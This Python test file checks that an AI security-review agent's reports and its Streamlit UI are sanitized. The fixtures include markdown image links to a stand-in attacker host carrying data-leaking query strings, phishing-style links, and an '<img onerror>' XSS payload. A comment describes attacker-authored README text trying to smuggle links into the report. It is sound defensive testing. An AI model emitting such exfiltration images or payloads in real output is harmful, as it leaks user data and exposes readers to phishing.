"""Links in rendered output: the orchestrator's report, and the Streamlit UI end to end."""

import pytest

from agents.orchestrator.logic import run_orchestrator
from core.harness import HarnessResult
from core.memory import SessionMemory

EVIL = "https://evil.example"
TASK = "Review https://github.com/o/r for security"


def harness_result(report, outputs=()):
    calls = [{"tool": "cve_impact", "args": {"input": "https://github.com/o/r"}, "output": o} for o in outputs] or [
        {"tool": "cve_impact", "args": {"input": "https://github.com/o/r"}, "output": {}}
    ]
    return HarnessResult(final_message=report, tool_calls=calls, steps_used=1)


def run(mocker, report, outputs=(), task=TASK, session=None):
    mocker.patch("agents.orchestrator.logic.run_harness", return_value=harness_result(report, outputs))
    return run_orchestrator(task, session=session)


class TestOrchestratorReport:
    def test_images_are_removed(self, mocker):
        result = run(mocker, f"Findings ![x]({EVIL}/leak?d=secret) done")
        assert result["report"] == "Findings x done"  # nothing left to load, not even the URL

    def test_links_the_user_named_survive(self, mocker):
        result = run(mocker, "See [the repo](https://github.com/o/r) and [an issue](https://github.com/o/r/issues/4).")
        assert "[the repo](https://github.com/o/r)" in result["report"]
        assert "[an issue](https://github.com/o/r/issues/4)" in result["report"]

    def test_links_from_structured_tool_result_fields_survive(self, mocker):
        outputs = [{"cve_analysis": [{"url": "https://osv.dev/vulnerability/GHSA-x"}]}]
        result = run(mocker, "Details: [advisory](https://osv.dev/vulnerability/GHSA-x)", outputs)
        assert "[advisory](https://osv.dev/vulnerability/GHSA-x)" in result["report"]

    def test_urls_that_only_appear_in_free_text_of_a_tool_result_are_not_trusted(self, mocker):
        # A README (attacker-authored) mentions the URL; that must not make it linkable.
        outputs = [{"readme": f"Docs: {EVIL}/phish", "summary": f"see [x]({EVIL}/phish)"}]
        result = run(mocker, f"Read [the docs]({EVIL}/phish) first.", outputs)
        assert "](" not in result["report"]
        assert f"`{EVIL}/phish`" in result["report"]  # visible, but inert

    def test_a_link_the_model_invented_is_defanged(self, mocker):
        result = run(mocker, "Get help at [support](https://help-desk.evil.example/login)")
        assert "](" not in result["report"]

    def test_urls_from_earlier_in_the_session_are_allowed(self, mocker):
        session = SessionMemory()
        session.record("repo_onboarding", "https://github.com/a/b", {})
        result = run(mocker, "Compare with [that repo](https://github.com/a/b).", session=session, task="compare with before")
        assert "[that repo](https://github.com/a/b)" in result["report"]

    def test_sources_are_reported_for_the_ui_to_recheck(self, mocker):
        outputs = [{"url": "https://osv.dev/vulnerability/X"}]
        result = run(mocker, "r", outputs)
        assert "https://github.com/o/r" in result["sources"]
        assert "https://osv.dev/vulnerability/X" in result["sources"]

    def test_already_clean_reports_are_unchanged(self, mocker):
        text = "## Summary\n\n- **High**: upgrade `requests`.\n- Nothing else."
        assert run(mocker, text)["report"] == text


# ---- the real app -----------------------------------------------------------------------------------

HOSTILE_PLAN = (
    f"## Plan\n\nStep one ![tracking pixel]({EVIL}/px?leak=abc)\n\n"
    f"Read [the official docs]({EVIL}/login) and https://other.example/x and www.evil.example.\n\n"
    "See [the repo](https://github.com/o/r/issues/7) for context.\n\n<img src=x onerror=alert(1)>"
)


@pytest.fixture
def app(mocker):
    """The real Streamlit app, run headlessly, with the issue planner replaced by a stub."""
    from streamlit.testing.v1 import AppTest

    mocker.patch(
        "agents.issue_fix_planner.logic.run_issue_fix_planner",
        return_value={"status": "success", "plan": HOSTILE_PLAN, "issue_title": "Bug", "issue_url": "https://github.com/o/r/issues/7"},
    )
    at = AppTest.from_file("app.py", default_timeout=30).run()
    assert not at.exception, at.exception
    return at


class TestStreamlitApp:
    def test_the_app_loads(self, app):
        assert not app.exception

    def test_hostile_plan_is_sanitized_before_rendering(self, app):
        app.session_state["last_request_at"] = 0
        app.text_input(key="issue_planner_form_input").set_value("https://github.com/o/r/issues/7")
        next(b for b in app.button if b.label == "Generate Plan").click()
        app.run(timeout=30)

        assert not app.exception
        rendered = "\n".join(m.value for m in app.markdown)
        assert "Step one" in rendered                           # the content is there
        assert "![" not in rendered                             # image removed
        assert "px?leak" not in rendered                        # and its URL is not shown at all
        assert f"]({EVIL}" not in rendered                      # no link to the attacker's site
        assert f"`{EVIL}/login`" in rendered                    # the link's URL is visible as inert code
        assert "`https://other.example/x`" in rendered          # bare URLs are inert too
        assert "`www.evil.example`" in rendered
        assert "[the repo](https://github.com/o/r/issues/7)" in rendered  # the grounded link survives
        assert "\\<img" in rendered                             # raw HTML is inert text
